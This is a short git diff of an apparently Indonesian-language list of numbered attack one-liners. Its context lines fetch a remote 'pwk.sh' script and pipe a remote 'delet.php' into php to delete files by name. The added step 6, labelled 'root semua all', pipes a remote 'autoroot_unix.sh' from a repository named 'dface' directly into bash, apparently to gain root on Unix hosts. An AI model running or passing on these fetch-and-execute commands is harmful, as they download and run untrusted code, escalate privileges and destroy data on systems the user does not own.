@@ -20,3 +20,8 @@ wget https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/pwk.sh 
 5, Mendelet berdasarkan nama file kon7l
 
 curl -s https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/delet.php | php namafile.php
+
+
+6, root semua all
+
+wget https://raw.githubusercontent.com/pwnsauce403/dface/main/tahi/autoroot/autoroot_unix.sh -q -O - |bash
